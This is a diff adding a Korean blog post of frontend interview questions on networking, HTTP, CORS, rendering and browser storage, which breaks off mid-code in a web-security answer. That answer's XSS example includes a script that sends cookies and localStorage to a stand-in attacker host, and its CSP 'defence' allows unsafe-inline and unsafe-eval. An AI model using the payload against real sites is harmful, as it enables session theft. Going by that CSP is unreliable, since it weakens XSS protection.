@@ -1,0 +1,1481 @@
+---
+title: "프론트엔드 면접 질문 - CS"
+date: "2025-10-21"
+modified: "2025-10-21"
+category: "기술"
+tags: ["면접"]
+excerpt: "프론트엔드 면접 시 CS 면접 질문들입니다."
+---
+
+## 💻 Computer Science
+
+### Q1. OSI 7계층 모델을 설명하고, HTTP가 어느 계층에서 동작하는지 설명해주세요.
+
+**키워드:** `프로토콜 스택`, `캡슐화`, `TCP/IP`, `패킷`, `라우팅`
+
+**답변:**
+
+**OSI 7계층:**
+
+| 계층 | 이름         | 역할                           | 프로토콜/장비               |
+| ---- | ------------ | ------------------------------ | --------------------------- |
+| 7    | Application  | 사용자 인터페이스, 응용 서비스 | HTTP, HTTPS, FTP, DNS, SMTP |
+| 6    | Presentation | 데이터 변환, 암호화, 압축      | SSL/TLS, JPEG, MPEG         |
+| 5    | Session      | 세션 관리, 연결 유지           | NetBIOS, RPC                |
+| 4    | Transport    | 신뢰성, 흐름 제어, 포트        | TCP, UDP                    |
+| 3    | Network      | 라우팅, IP 주소                | IP, ICMP, Router            |
+| 2    | Data Link    | MAC 주소, 프레임, 에러 검출    | Ethernet, PPP, Switch       |
+| 1    | Physical     | 물리적 전송, 비트              | Cable, Hub, 전기 신호       |
+
+**HTTP는 7계층 (Application Layer)에서 동작**
+
+**데이터 전송 과정:**
+
+```jsx
+// 7계층: HTTP 요청 생성
+fetch("https://api.example.com/users");
+
+// 6계층: TLS 암호화 (HTTPS)
+// - 데이터 암호화
+// - 인증서 검증
+
+// 5계층: 세션 수립
+// - 연결 유지 관리
+
+// 4계층: TCP 세그먼트 생성
+// - 3-way handshake (SYN → SYN-ACK → ACK)
+// - 포트 번호 추가 (443)
+// - 순서 번호, 체크섬
+
+// 3계층: IP 패킷 생성
+// - 출발지/목적지 IP 주소
+// - 라우팅 경로 결정
+// - TTL 설정
+
+// 2계층: 프레임 생성
+// - MAC 주소 추가
+// - 에러 검출 (CRC)
+
+// 1계층: 물리적 전송
+// - 비트 → 전기/광 신호
+```
+
+**프론트엔드 관점:**
+
+```jsx
+// Application Layer에서 작업
+const response = await fetch("https://api.example.com/data", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    Authorization: "Bearer token",
+  },
+  body: JSON.stringify({ data: "value" }),
+});
+
+// 하위 계층은 브라우저/OS가 자동 처리
+// - TCP 연결
+// - IP 라우팅
+// - 물리적 전송
+```
+
+**TCP/IP 모델 (실무에서 더 많이 사용):**
+
+```
+OSI 7계층          TCP/IP 4계층
+───────────────    ────────────
+Application   ┐
+Presentation  │ →  Application
+Session       ┘
+Transport        →  Transport
+Network          →  Internet
+Data Link     ┐
+Physical      ┘ →  Network Access
+```
+
+---
+
+### Q2. TCP와 UDP의 차이점, 그리고 각각의 사용 사례를 설명해주세요.
+
+**키워드:** `연결 지향`, `신뢰성`, `3-way handshake`, `흐름 제어`, `혼잡 제어`, `실시간`
+
+**답변:**
+
+**TCP (Transmission Control Protocol)**
+
+**특징:**
+
+- **연결 지향**: 3-way handshake로 연결 수립
+- **신뢰성**: 데이터 손실 시 재전송
+- **순서 보장**: 패킷이 순서대로 도착
+- **흐름 제어**: 수신자 버퍼 크기에 맞춤
+- **혼잡 제어**: 네트워크 상황 고려
+- **오버헤드**: 헤더 크기 20-60 bytes
+
+**3-way Handshake:**
+
+```
+클라이언트              서버
+   |                    |
+   |  ---- SYN ---->    |  1. 연결 요청
+   |                    |
+   |  <-- SYN-ACK ---   |  2. 응답 + 연결 요청
+   |                    |
+   |  ---- ACK ---->    |  3. 응답
+   |                    |
+   |  (연결 확립)        |
+```
+
+**UDP (User Datagram Protocol)**
+
+**특징:**
+
+- **비연결**: 사전 연결 없이 전송
+- **신뢰성 없음**: 데이터 손실 가능
+- **순서 보장 안함**: 순서 뒤바뀔 수 있음
+- **빠름**: 오버헤드 적음
+- **실시간**: 지연 시간 최소화
+- **오버헤드**: 헤더 크기 8 bytes
+
+**비교표:**
+
+| 특징      | TCP         | UDP       |
+| --------- | ----------- | --------- |
+| 연결      | 연결 지향   | 비연결    |
+| 신뢰성    | 보장        | 보장 안함 |
+| 순서      | 보장        | 보장 안함 |
+| 속도      | 느림        | 빠름      |
+| 헤더 크기 | 20-60 bytes | 8 bytes   |
+| 흐름 제어 | O           | X         |
+| 혼잡 제어 | O           | X         |
+| 재전송    | O           | X         |
+
+**사용 사례:**
+
+**TCP 사용:**
+
+```jsx
+// 1. HTTP/HTTPS (웹)
+fetch("https://api.example.com/data");
+
+// 2. 파일 전송 (FTP)
+// 데이터 무결성 중요
+
+// 3. 이메일 (SMTP, POP3, IMAP)
+// 순서와 신뢰성 필요
+
+// 4. SSH
+// 보안 연결 필요
+
+// 5. WebSocket
+const ws = new WebSocket("ws://example.com");
+// 초기 연결은 HTTP (TCP)
+```
+
+**UDP 사용:**
+
+```jsx
+// 1. DNS
+// 빠른 응답 필요, 재요청 가능
+
+// 2. 실시간 스트리밍
+const peer = new RTCPeerConnection();
+// WebRTC는 UDP 기반
+
+// 3. VoIP (음성 통화)
+// 지연 시간이 중요, 일부 손실 허용
+
+// 4. 온라인 게임
+// 실시간 위치 업데이트
+// 일부 패킷 손실해도 다음 업데이트로 보정
+
+// 5. 비디오 회의
+// 실시간성이 품질보다 중요
+```
+
+**프론트엔드 예제:**
+
+```jsx
+// TCP: fetch API
+async function fetchData() {
+  const response = await fetch("/api/data");
+  // TCP가 자동으로 처리:
+  // - 연결 수립
+  // - 데이터 신뢰성
+  // - 순서 보장
+  return response.json();
+}
+
+// UDP: WebRTC (P2P 통신)
+const peer = new RTCPeerConnection();
+
+// 데이터 채널 (UDP 기반)
+const channel = peer.createDataChannel("game");
+
+channel.onmessage = (event) => {
+  // 실시간 게임 데이터
+  updatePlayerPosition(event.data);
+};
+
+// 일부 패킷 손실되어도 다음 업데이트로 보정
+channel.send(JSON.stringify({ x: 100, y: 200 }));
+```
+
+**선택 기준:**
+
+- **신뢰성이 중요** → TCP
+- **속도가 중요** → UDP
+- **데이터 무결성 필수** → TCP
+- **실시간 스트리밍** → UDP
+- **파일 전송** → TCP
+- **게임/영상 통화** → UDP
+
+---
+
+### Q3. HTTP/1.1, HTTP/2, HTTP/3의 차이점과 성능 개선 사항을 설명해주세요.
+
+**키워드:** `멀티플렉싱`, `헤더 압축`, `서버 푸시`, `QUIC`, `HOL Blocking`, `0-RTT`
+
+**답변:**
+
+**HTTP/1.1 (1997)**
+
+**특징:**
+
+- 텍스트 기반 프로토콜
+- 한 연결당 하나의 요청/응답
+- Keep-Alive로 연결 재사용
+- 파이프라이닝 (실제로는 잘 안씀)
+
+**문제점:**
+
+```jsx
+// Head-of-Line (HOL) Blocking
+// 첫 번째 요청이 느리면 뒤 요청도 대기
+
+// 요청 1 (10초) ────────────▶
+// 요청 2 (1초)  기다림...    ────▶
+// 요청 3 (1초)  기다림...         ────▶
+
+// 해결책: 도메인 샤딩
+<img src="https://cdn1.example.com/a.jpg" />
+<img src="https://cdn2.example.com/b.jpg" />
+<img src="https://cdn3.example.com/c.jpg" />
+// 브라우저 연결 제한 우회 (도메인당 6개)
+```
+
+**HTTP/2 (2015)**
+
+**주요 개선사항:**
+
+```jsx
+// 1. 멀티플렉싱
+// 하나의 연결로 여러 요청 병렬 처리
+// Stream 개념 도입
+
+Request 1  ─┬─────▶
+Request 2  ─┤─────▶
+Request 3  ─┴─────▶
+           단일 TCP 연결
+
+// 2. 헤더 압축 (HPACK)
+// 중복 헤더 제거, 이전 헤더 재사용
+Headers: 500 bytes → 50 bytes
+
+// 3. 서버 푸시
+// 클라이언트 요청 전에 리소스 전송
+// HTML 요청 → 서버가 CSS/JS도 같이 푸시
+
+// 4. 우선순위 지정
+// 중요한 리소스 먼저 로드
+stream.priority = { weight: 256, dependency: 0 };
+
+// 5. 바이너리 프로토콜
+// 파싱 속도 향상, 오류 감소
+```
+
+**장점:**
+
+```jsx
+// 도메인 샤딩 불필요
+// 모든 리소스를 하나의 연결로
+<link rel="stylesheet" href="/style.css">
+<script src="/app.js"></script>
+<img src="/hero.jpg">
+// 모두 단일 HTTP/2 연결로 병렬 전송
+
+// 페이지 로드 속도 30-50% 개선
+```
+
+**한계:**
+
+- TCP HOL Blocking 여전히 존재
+- 패킷 손실 시 모든 스트림 영향
+
+**HTTP/3 (2022)**
+
+**핵심 변경: TCP → QUIC (UDP 기반)**
+
+```jsx
+// QUIC 특징
+// 1. UDP 기반
+// - TCP HOL Blocking 해결
+// - 각 스트림 독립적
+
+Stream 1 ─────▶ (패킷 손실)
+Stream 2 ─────▶ (정상 진행) ✅
+Stream 3 ─────▶ (정상 진행) ✅
+
+// 2. 빠른 연결 (0-RTT)
+// 이전 연결 정보 재사용
+// 첫 패킷에 데이터 포함
+
+// 3. 연결 마이그레이션
+// WiFi ↔ 모바일 전환 시 연결 유지
+// Connection ID 사용
+
+// 4. 내장 TLS 1.3
+// 별도 핸드셰이크 불필요
+```
+
+**성능 비교:**
+
+| 특징           | HTTP/1.1   | HTTP/2     | HTTP/3     |
+| -------------- | ---------- | ---------- | ---------- |
+| 전송 프로토콜  | TCP        | TCP        | QUIC (UDP) |
+| 멀티플렉싱     | ❌         | ✅         | ✅         |
+| 헤더 압축      | ❌         | ✅ (HPACK) | ✅ (QPACK) |
+| 서버 푸시      | ❌         | ✅         | ✅         |
+| HOL Blocking   | TCP + HTTP | TCP만      | ❌         |
+| 연결 시간      | 2-3 RTT    | 1-2 RTT    | 0-1 RTT    |
+| 패킷 손실 영향 | 큼         | 중간       | 작음       |
+| 암호화         | 선택       | 선택       | 필수       |
+
+**RTT (Round Trip Time) 비교:**
+
+```
+HTTP/1.1 over TLS:
+TCP handshake    (1 RTT)
+TLS handshake    (2 RTT)
+HTTP Request     (1 RTT)
+총: 4 RTT
+
+HTTP/2 over TLS:
+TCP handshake    (1 RTT)
+TLS handshake    (1 RTT) [TLS 1.3]
+HTTP Request     (0 RTT) [멀티플렉싱]
+총: 2 RTT
+
+HTTP/3:
+QUIC handshake   (1 RTT) [첫 연결]
+HTTP Request     (0 RTT)
+총: 1 RTT
+
+HTTP/3 (0-RTT):
+이전 연결 정보로 (0 RTT)
+총: 0 RTT
+```
+
+**Next.js에서 확인:**
+
+```jsx
+// next.config.js
+module.exports = {
+  // Vercel은 자동으로 HTTP/2, HTTP/3 지원
+
+  headers: async () => [
+    {
+      source: "/:path*",
+      headers: [
+        // HTTP/3 광고
+        {
+          key: "Alt-Svc",
+          value: 'h3=":443"; ma=86400',
+        },
+      ],
+    },
+  ],
+};
+
+// 브라우저 DevTools에서 확인
+// Network 탭 → Protocol 컬럼
+// h2: HTTP/2
+// h3: HTTP/3
+```
+
+**실무 적용:**
+
+```jsx
+// HTTP/2 최적화
+// ❌ 더 이상 불필요
+// - 도메인 샤딩
+// - CSS 스프라이트
+// - 파일 번들링 (과도한)
+
+// ✅ HTTP/2에 맞는 최적화
+// - 적절한 코드 스플리팅
+// - 모듈 단위 번들링
+// - 단일 도메인 사용
+```
+
+---
+
+### Q4. CORS의 동작 원리와 해결 방법을 설명해주세요.
+
+**키워드:** `Same-Origin Policy`, `Preflight`, `Simple Request`, `CORS 헤더`, `프록시`
+
+**답변:**
+
+**CORS (Cross-Origin Resource Sharing)**
+브라우저 보안 정책으로, 다른 출처의 리소스 요청을 제한
+
+**출처(Origin) 구성:**
+
+```
+https://example.com:443/path?query
+└─┬─┘   └────┬─────┘└┬┘
+  │          │       │
+프로토콜    도메인    포트
+
+같은 출처:
+https://example.com:443
+https://example.com:443/api
+https://example.com:443/path
+
+다른 출처:
+http://example.com        (프로토콜 다름)
+https://api.example.com   (서브도메인 다름)
+https://example.com:8080  (포트 다름)
+https://example.org       (도메인 다름)
+```
+
+**Simple Request (단순 요청)**
+
+**조건:**
+
+- GET, POST, HEAD 메서드
+- 허용된 헤더만 사용
+- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
+
+```jsx
+// Simple Request
+fetch("https://api.example.com/data", {
+  method: "GET",
+});
+
+// 브라우저가 자동으로 Origin 헤더 추가
+// Origin: https://myapp.com
+
+// 서버 응답에 CORS 헤더 필요
+// Access-Control-Allow-Origin: https://myapp.com
+// 또는
+// Access-Control-Allow-Origin: *
+```
+
+**Preflight Request (사전 요청)**
+
+**조건:**
+
+- PUT, DELETE, PATCH 메서드
+- 커스텀 헤더 사용
+- Content-Type: application/json
+
+```jsx
+// Preflight가 필요한 요청
+fetch('https://api.example.com/data', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer token',
+    'X-Custom-Header': 'value'
+  },
+  body: JSON.stringify({ data: 'value' })
+});
+
+// 실제 전송 순서:
+// 1. OPTIONS 요청 (Preflight)
+OPTIONS /data HTTP/1.1
+Origin: https://myapp.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: authorization,content-type,x-custom-header
+
+// 2. 서버 응답
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://myapp.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: authorization,content-type,x-custom-header
+Access-Control-Max-Age: 86400  // Preflight 캐시 시간
+
+// 3. 실제 POST 요청
+POST /data HTTP/1.1
+...
+```
+
+**서버 측 해결 (Express)**
+
+```jsx
+const express = require("express");
+const app = express();
+
+// 1. 모든 출처 허용 (개발 환경)
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH");
+  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
+
+  // Preflight 처리
+  if (req.method === "OPTIONS") {
+    return res.sendStatus(200);
+  }
+
+  next();
+});
+
+// 2. 특정 출처만 허용 (프로덕션)
+const allowedOrigins = ["https://myapp.com", "https://www.myapp.com"];
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+
+  if (allowedOrigins.includes(origin)) {
+    res.header("Access-Control-Allow-Origin", origin);
+  }
+
+  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
+  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
+  res.header("Access-Control-Allow-Credentials", "true"); // 쿠키 포함
+  res.header("Access-Control-Max-Age", "86400"); // 24시간
+
+  if (req.method === "OPTIONS") {
+    return res.sendStatus(200);
+  }
+
+  next();
+});
+
+// 3. cors 라이브러리 사용
+const cors = require("cors");
+
+app.use(
+  cors({
+    origin: (origin, callback) => {
+      if (!origin || allowedOrigins.includes(origin)) {
+        callback(null, true);
+      } else {
+        callback(new Error("Not allowed by CORS"));
+      }
+    },
+    credentials: true,
+    methods: ["GET", "POST", "PUT", "DELETE"],
+    allowedHeaders: ["Content-Type", "Authorization"],
+    maxAge: 86400,
+  })
+);
+```
+
+**Next.js에서 해결:**
+
+```jsx
+// 1. next.config.js에서 헤더 설정
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: "/api/:path*",
+        headers: [
+          { key: "Access-Control-Allow-Origin", value: "*" },
+          { key: "Access-Control-Allow-Methods", value: "GET,POST,PUT,DELETE" },
+          { key: "Access-Control-Allow-Headers", value: "Content-Type, Authorization" },
+        ],
+      },
+    ];
+  },
+};
+
+// 2. API Route에서 직접 처리
+// app/api/data/route.js
+export async function OPTIONS() {
+  return new Response(null, {
+    status: 200,
+    headers: {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
+      "Access-Control-Allow-Headers": "Content-Type, Authorization",
+    },
+  });
+}
+
+export async function GET(request) {
+  const response = NextResponse.json({ data: "value" });
+
+  response.headers.set("Access-Control-Allow-Origin", "*");
+
+  return response;
+}
+
+// 3. 프록시 사용 (개발 환경)
+// next.config.js
+module.exports = {
+  async rewrites() {
+    return [
+      {
+        source: "/api/:path*",
+        destination: "https://external-api.com/:path*",
+      },
+    ];
+  },
+};
+
+// 프론트엔드에서 Same-Origin 요청으로 인식
+fetch("/api/data"); // CORS 문제 없음
+```
+
+**쿠키 포함 요청:**
+
+```jsx
+// 클라이언트
+fetch("https://api.example.com/data", {
+  credentials: "include", // 쿠키 포함
+});
+
+// 서버 (반드시 특정 출처 지정)
+res.header("Access-Control-Allow-Origin", "https://myapp.com"); // * 불가
+res.header("Access-Control-Allow-Credentials", "true");
+```
+
+**CORS 에러 디버깅:**
+
+```jsx
+// 1. 콘솔 에러 확인
+// "Access to fetch at '...' from origin '...' has been blocked by CORS policy"
+
+// 2. Network 탭 확인
+// - Preflight 요청 (OPTIONS) 확인
+// - 응답 헤더 확인
+
+// 3. 서버 로그 확인
+// - OPTIONS 요청 처리 확인
+// - 헤더 설정 확인
+
+// 4. 브라우저 확장 (임시)
+// - Allow CORS 확장 설치
+// - 개발 중에만 사용
+```
+
+---
+
+### Q5. 브라우저의 렌더링 과정(Critical Rendering Path)을 설명해주세요.
+
+**키워드:** `DOM`, `CSSOM`, `Render Tree`, `Layout`, `Paint`, `Composite`, `Reflow`, `Repaint`
+
+**답변:**
+
+**렌더링 파이프라인:**
+
+```
+HTML → DOM Tree
+CSS → CSSOM Tree
+DOM + CSSOM → Render Tree
+Render Tree → Layout (Reflow)
+Layout → Paint
+Paint → Composite
+```
+
+**1. DOM 생성**
+
+```html
+<html>
+  <body>
+    <div class="container">
+      <h1>Title</h1>
+      <p>Content</p>
+    </div>
+  </body>
+</html>
+
+→ DOM Tree: html └─ body └─ div.container ├─ h1 └─ p
+```
+
+**2. CSSOM 생성**
+
+```css
+body { font-size: 16px; }
+.container { max-width: 1200px; }
+h1 { color: blue; }
+p { color: gray; }
+
+→ CSSOM Tree:
+body: { font-size: 16px }
+ └─ div.container: { max-width: 1200px }
+     ├─ h1: { color: blue, font-size: 16px }
+     └─ p: { color: gray, font-size: 16px }
+```
+
+**3. Render Tree 생성**
+
+```
+DOM + CSSOM → Render Tree
+
+- display: none은 제외
+- visibility: hidden은 포함
+- <script>, <meta> 등은 제외
+```
+
+**4. Layout (Reflow)**
+
+```jsx
+// 각 노드의 정확한 위치와 크기 계산
+// - 뷰포트 크기
+// - 부모/자식 관계
+// - CSS Box Model
+
+// Reflow를 유발하는 속성:
+// width, height, margin, padding
+// border, position, display
+// float, overflow, font-size
+```
+
+**5. Paint**
+
+```jsx
+// 픽셀로 변환
+// - 색상, 이미지, 텍스트, 그림자
+// - 여러 레이어로 분리
+
+// Repaint를 유발하는 속성:
+// color, background, visibility
+// box-shadow, border-radius
+```
+
+**6. Composite**
+
+```jsx
+// 레이어들을 합성하여 최종 화면 생성
+// GPU 가속 사용
+```
+
+**렌더링 차단 리소스:**
+
+```html
+<html>
+  <head>
+    <!-- CSS는 렌더링 차단 -->
+    <link rel="stylesheet" href="style.css" />
+    <!-- JS는 파싱 차단 -->
+    <script src="bundle.js"></script>
+  </head>
+  <body>
+    <div>Content</div>
+  </body>
+</html>
+
+실행 순서: 1. HTML 파싱 시작 2. style.css 다운로드 대기 (렌더링 차단) 3. CSSOM 생성 4. bundle.js 다운로드 및 실행 (파싱 차단) 5. HTML 파싱 재개 6. 렌더링 시작
+```
+
+**최적화 기법:**
+
+```html
+<!-- 1. CSS: 최대한 빨리 로드 -->
+<link rel="stylesheet" href="critical.css" />
+<link rel="stylesheet" href="non-critical.css" media="print" />
+<link rel="preload" href="font.woff2" as="font" crossorigin />
+
+<!-- 2. JavaScript: defer/async 사용 -->
+<script src="analytics.js" async></script>
+<!-- async: 다운로드 후 즉시 실행 (순서 무관) -->
+
+<script src="app.js" defer></script>
+<!-- defer: HTML 파싱 완료 후 실행 (순서 보장) -->
+
+<!-- 3. 리소스 힌트 -->
+<link rel="preconnect" href="https://api.example.com" />
+<!-- DNS lookup, TCP handshake, TLS negotiation 미리 수행 -->
+
+<link rel="dns-prefetch" href="https://fonts.googleapis.com" />
+<!-- DNS lookup만 미리 수행 -->
+
+<link rel="prefetch" href="/next-page.js" />
+<!-- 다음에 필요할 리소스 미리 다운로드 (낮은 우선순위) -->
+
+<!-- 4. Critical CSS -->
+<style>
+  /* Above-the-fold CSS를 인라인으로 */
+  .hero {
+    ...;
+  }
+</style>
+```
+
+**Reflow/Repaint 최소화:**
+
+```jsx
+// ❌ Layout Thrashing (강제 동기 레이아웃)
+const h1 = element1.offsetHeight; // Read (레이아웃 계산)
+element1.style.height = `${h1 * 2}px`; // Write
+
+const h2 = element2.offsetHeight; // Read (다시 계산!)
+element2.style.height = `${h2 * 2}px`; // Write
+
+// ✅ Read → Write 분리
+const h1 = element1.offsetHeight; // Read
+const h2 = element2.offsetHeight; // Read
+
+element1.style.height = `${h1 * 2}px`; // Write
+element2.style.height = `${h2 * 2}px`; // Write
+
+// ✅ 한 번에 변경
+element.style.cssText = `
+  width: 100px;
+  height: 100px;
+  margin: 10px;
+`; // 한 번만 Reflow
+
+// ✅ 클래스 사용
+element.classList.add("resized");
+
+// ✅ DocumentFragment 사용
+const fragment = document.createDocumentFragment();
+for (let i = 0; i < 100; i++) {
+  const li = document.createElement("li");
+  fragment.appendChild(li);
+}
+list.appendChild(fragment); // 한 번만 Reflow
+```
+
+**GPU 가속 활용:**
+
+```css
+/* GPU 가속 속성 (Composite만 발생) */
+.animated {
+  transform: translateX(100px); /* ✅ */
+  will-change: transform; /* 미리 최적화 */
+}
+
+/* Reflow 유발 속성 피하기 */
+.box {
+  /* ❌ Reflow */
+  left: 100px;
+
+  /* ✅ Composite만 */
+  transform: translateX(100px);
+}
+
+/* Repaint 유발 속성 피하기 */
+.box {
+  /* ❌ Repaint */
+  background: red;
+
+  /* ✅ Composite만 */
+  opacity: 0.5;
+}
+```
+
+**성능 측정:**
+
+```jsx
+// Performance API
+performance.mark("start-render");
+
+// 렌더링 작업
+
+performance.mark("end-render");
+performance.measure("render-time", "start-render", "end-render");
+
+const measures = performance.getEntriesByType("measure");
+console.log(measures[0].duration);
+
+// DevTools Performance 탭
+// - Scripting: JS 실행
+// - Rendering: Layout + Paint
+// - Painting: Paint만
+// - Composite Layers: Composite
+```
+
+---
+
+### Q6. 쿠키, 세션, 로컬스토리지, 세션스토리지의 차이점을 설명해주세요.
+
+**키워드:** `클라이언트 저장소`, `용량`, `만료`, `HTTP 전송`, `보안`, `도메인`
+
+**답변:**
+
+**비교표:**
+
+| 특징      | Cookie          | LocalStorage | SessionStorage | Session (서버) |
+| --------- | --------------- | ------------ | -------------- | -------------- |
+| 저장 위치 | 클라이언트      | 클라이언트   | 클라이언트     | 서버           |
+| 용량      | 4KB             | 5-10MB       | 5-10MB         | 무제한         |
+| 만료      | 설정 가능       | 영구         | 탭 닫으면 삭제 | 서버 설정      |
+| HTTP 전송 | 매 요청마다     | 안함         | 안함           | Session ID만   |
+| 접근      | 서버/클라이언트 | 클라이언트만 | 클라이언트만   | 서버만         |
+| 범위      | 도메인/경로     | 도메인       | 탭             | 서버           |
+
+**Cookie:**
+
+```jsx
+// 설정
+document.cookie = "user=John; max-age=3600; path=/; secure; samesite=strict";
+
+// 속성:
+// - max-age: 만료 시간 (초)
+// - expires: 만료 날짜
+// - path: 경로
+// - domain: 도메인
+// - secure: HTTPS만
+// - httpOnly: JS 접근 불가 (서버에서만 설정)
+// - samesite: CSRF 방어 (strict/lax/none)
+
+// 읽기
+const cookies = document.cookie.split("; ").reduce((acc, cookie) => {
+  const [key, value] = cookie.split("=");
+  acc[key] = decodeURIComponent(value);
+  return acc;
+}, {});
+
+console.log(cookies.user); // 'John'
+
+// 삭제 (과거 날짜로 설정)
+document.cookie = "user=; max-age=0";
+
+// Next.js (서버 컴포넌트)
+import { cookies } from "next/headers";
+
+const cookieStore = cookies();
+const token = cookieStore.get("token");
+cookieStore.set("user", "John", {
+  httpOnly: true,
+  secure: true,
+  sameSite: "strict",
+  maxAge: 3600,
+});
+```
+
+**localStorage:**
+
+```jsx
+// 설정
+localStorage.setItem("theme", "dark");
+localStorage.setItem("user", JSON.stringify({ name: "John", age: 30 }));
+
+// 읽기
+const theme = localStorage.getItem("theme"); // 'dark'
+const user = JSON.parse(localStorage.getItem("user"));
+
+// 삭제
+localStorage.removeItem("theme");
+localStorage.clear(); // 전체 삭제
+
+// 용량 체크
+try {
+  localStorage.setItem("test", "data");
+} catch (e) {
+  if (e.name === "QuotaExceededError") {
+    console.log("Storage full");
+  }
+}
+
+// 이벤트 리스닝 (다른 탭에서 변경 감지)
+window.addEventListener("storage", (e) => {
+  if (e.key === "theme") {
+    console.log("Theme changed:", e.newValue);
+    updateTheme(e.newValue);
+  }
+});
+
+// 사용 사례:
+// - 사용자 설정 (테마, 언어)
+// - 캐시 데이터
+// - 폼 임시 저장
+```
+
+**sessionStorage:**
+
+```jsx
+// API는 localStorage와 동일
+sessionStorage.setItem("tempData", "value");
+const data = sessionStorage.getItem("tempData");
+sessionStorage.removeItem("tempData");
+sessionStorage.clear();
+
+// 차이점:
+// 1. 탭을 닫으면 삭제됨
+// 2. 같은 도메인이어도 다른 탭은 별도 저장소
+// 3. storage 이벤트 발생 안함
+
+// 사용 사례:
+// - 임시 폼 데이터
+// - 위자드/스텝 진행 상태
+// - 일회성 데이터
+```
+
+**Server Session:**
+
+```jsx
+// app/api/login/route.js (Next.js)
+import { cookies } from "next/headers";
+
+export async function POST(request) {
+  const { username, password } = await request.json();
+
+  // 인증
+  const user = await authenticate(username, password);
+
+  if (!user) {
+    return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
+  }
+
+  // 세션 생성 (서버 메모리/DB/Redis)
+  const sessionId = createSession(user);
+
+  // 세션 ID를 쿠키에 저장
+  cookies().set("session", sessionId, {
+    httpOnly: true, // JS 접근 불가 (XSS 방어)
+    secure: true, // HTTPS만
+    sameSite: "strict", // CSRF 방어
+    maxAge: 60 * 60 * 24 * 7, // 7일
+  });
+
+  return NextResponse.json({ user });
+}
+
+// 세션 확인
+export async function GET(request) {
+  const sessionId = cookies().get("session")?.value;
+
+  if (!sessionId) {
+    return NextResponse.json({ error: "Not logged in" }, { status: 401 });
+  }
+
+  const session = await getSession(sessionId);
+
+  if (!session) {
+    return NextResponse.json({ error: "Invalid session" }, { status: 401 });
+  }
+
+  return NextResponse.json({ user: session.user });
+}
+```
+
+**보안 고려사항:**
+
+| 공격        | Cookie          | LocalStorage   | SessionStorage | Server Session      |
+| ----------- | --------------- | -------------- | -------------- | ------------------- |
+| XSS         | httpOnly로 방어 | 취약 (JS 접근) | 취약 (JS 접근) | 안전                |
+| CSRF        | SameSite로 방어 | 자동 전송 안됨 | 자동 전송 안됨 | Cookie 사용 시 취약 |
+| 중간자 공격 | Secure 플래그   | HTTPS 필요     | HTTPS 필요     | HTTPS 필요          |
+
+**사용 권장사항:**
+
+```jsx
+// 1. 인증 토큰 → httpOnly Cookie
+cookies().set("token", jwt, {
+  httpOnly: true,
+  secure: true,
+  sameSite: "strict",
+});
+
+// 2. 테마, 언어 → localStorage
+localStorage.setItem("theme", "dark");
+localStorage.setItem("language", "ko");
+
+// 3. 임시 폼 데이터 → sessionStorage
+sessionStorage.setItem("draftPost", JSON.stringify(formData));
+
+// 4. 민감한 정보 → Server Session
+// - 사용자 권한
+// - 개인 정보
+// - 결제 정보
+
+// ❌ 절대 하지 말 것
+localStorage.setItem("password", "secret"); // 비밀번호
+localStorage.setItem("creditCard", "1234-5678"); // 카드 번호
+```
+
+**용량 초과 처리:**
+
+```jsx
+function setItem(key, value) {
+  try {
+    localStorage.setItem(key, JSON.stringify(value));
+  } catch (e) {
+    if (e.name === "QuotaExceededError") {
+      // 오래된 항목 삭제
+      const items = Object.keys(localStorage)
+        .map((key) => ({
+          key,
+          timestamp: JSON.parse(localStorage.getItem(key)).timestamp,
+        }))
+        .sort((a, b) => a.timestamp - b.timestamp);
+
+      // 가장 오래된 항목 삭제
+      localStorage.removeItem(items[0].key);
+
+      // 재시도
+      localStorage.setItem(key, JSON.stringify(value));
+    }
+  }
+}
+```
+
+---
+
+### Q7. 웹 보안(XSS, CSRF, SQL Injection)과 방어 방법을 설명해주세요.
+
+**키워드:** `스크립트 주입`, `토큰 검증`, `파라미터화`, `CSP`, `sanitize`, `httpOnly`
+
+**답변:**
+
+**1. XSS (Cross-Site Scripting)**
+
+**개념:** 악의적인 스크립트를 웹 페이지에 주입하는 공격
+
+**공격 예시:**
+
+```jsx
+// 사용자 입력을 그대로 렌더링
+const userInput = '<script>alert("XSS")</script>';
+element.innerHTML = userInput; // ❌ 위험
+
+// 실제 공격
+const userInput = `
+  <script>
+    fetch('https://attacker.com/steal', {
+      method: 'POST',
+      body: JSON.stringify({
+        cookie: document.cookie,
+        localStorage: localStorage
+      })
+    });
+  </script>
+`;
+
+// Stored XSS: DB에 저장되어 모든 사용자에게 영향
+// 댓글, 게시글 등에 악성 스크립트 삽입
+
+// Reflected XSS: URL 파라미터로 전달
+// https://example.com/search?q=<script>alert('XSS')</script>
+```
+
+**방어 방법:**
+
+```jsx
+// 1. React는 기본적으로 XSS 방어 (자동 이스케이프)
+const userInput = '<script>alert("XSS")</script>';
+return <div>{userInput}</div>; // 텍스트로 렌더링: &lt;script&gt;...
+
+// 2. HTML 렌더링이 필요한 경우 Sanitize
+import DOMPurify from "dompurify";
+
+const dirtyHTML = '<p>안전한 내용</p><script>alert("XSS")</script>';
+const cleanHTML = DOMPurify.sanitize(dirtyHTML);
+// 결과: '<p>안전한 내용</p>'
+
+return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
+
+// 3. CSP (Content Security Policy)
+// next.config.js
+const cspHeader = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' data:;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+`;
+
+module.exports = {
+  async headers() {
+    return [
+      {
